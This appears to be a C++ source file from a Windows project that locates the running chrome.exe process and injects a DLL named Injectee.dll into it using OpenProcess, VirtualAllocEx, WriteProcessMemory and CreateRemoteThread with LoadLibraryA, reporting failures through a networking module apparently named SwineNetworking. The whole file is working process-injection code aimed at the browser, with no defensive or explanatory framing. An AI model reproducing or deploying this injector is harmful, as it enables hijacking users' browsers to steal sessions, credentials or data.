#include "stdafx.h"
#include "Common.h"
#include <string.h>
#include <string>
#include <sstream>
#include <tchar.h>
#include "stdafx.h"
#include <windows.h>
#include <string.h>
#include <sstream>
#include <string>
#include "Shlwapi.h"
#include <iostream>
using namespace std;

#include <tchar.h>
#include "networking.h"



namespace InjecteeFuncs {


	int MyInjecteeFuncs::isProcess(DWORD processID, TCHAR *process_name) {
		TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
		// Get a handle to the process.
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
		// Get the process name.
		if (NULL != hProcess) {
			HMODULE hMod;
			DWORD cbNeeded;
			if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
				GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
			}
		}
		CloseHandle(hProcess);
		return (_tcscmp(process_name, szProcessName) == 0);
		// Print the process name and identifier.
		// Release the handle to the process.
	}
	int MyInjecteeFuncs::compare(const void * a, const void * b) {
		return (*(int*)a - *(int*)b);
	}
	int MyInjecteeFuncs::getNextProcessID(int current_process_id) {
		// Get the list of process identifiers.
		DWORD aProcesses[1024], cbNeeded, cProcesses;
		unsigned int i;
		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
			return 1;
		}
		// Calculate how many process identifiers were returned.
		cProcesses = cbNeeded / sizeof(DWORD);
		// Print the name and process identifier for each process.
		std::qsort(aProcesses, cProcesses, sizeof(DWORD), compare);
		int doInjection = (current_process_id == 0);
		for (i = 0; i < cProcesses; i++) {
			if (aProcesses[i] != 0) {
				if (isProcess(aProcesses[i], _T("chrome.exe"))) {
					//if (doInjection) {
						return aProcesses[i];
					//}
					//else if (aProcesses[i] == current_process_id) {
						doInjection = TRUE;
					//}
				}
			}
		}
		return 0;
	}
	void MyInjecteeFuncs::inject(int process_id) {
		printf("Injecting process\n");
		HANDLE target_process_handle;
		HANDLE thread;
		int success;
		// TODO (change path, maybe make it relative?)

		
		char buffer[MAX_PATH];
		GetModuleFileName(NULL, buffer, MAX_PATH);
		string::size_type pos = string(buffer).find_last_of("\\/");
		string a = string(buffer).substr(0, pos);
		a.append("\\Injectee.dll");
		printf(a.c_str());
		printf("\n");
		
		const char *filename = a.c_str(); 
		int size = strlen(filename);
		char message[1024];

		target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, process_id);
		if (target_process_handle == NULL) {
			sprintf(message, "OpenProcess %d failed.", process_id);
			SwineNetworking::Networking::logNetworking(message, strlen(message));
			exit(0);
		}

		void *target_filename = VirtualAllocEx(target_process_handle, NULL, size + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (target_filename == NULL) { printf("VirtualAllocEx failed."); exit(0); }

		int written = WriteProcessMemory(target_process_handle, target_filename, filename, size, NULL);
		if (written == 0) {
			sprintf(message, "WriteProcessMemory failed");
			SwineNetworking::Networking::logNetworking(message, strlen(message));
			exit(0);
		}

		thread = CreateRemoteThread(target_process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, target_filename, 0, NULL);
		if (written == NULL) {
			sprintf(message, "CreateRemoteThread failed.");
			SwineNetworking::Networking::logNetworking(message, strlen(message));
			exit(0);
		}
		printf("\nRemote Thread Created\n");

		success = CloseHandle(thread);
		if (!success) { printf("CloseHandle on thread failed."); exit(0); }
		success = CloseHandle(target_process_handle);
		if (!success) { printf("CloseHandle on process failed."); exit(0); }

		return;
	}
}
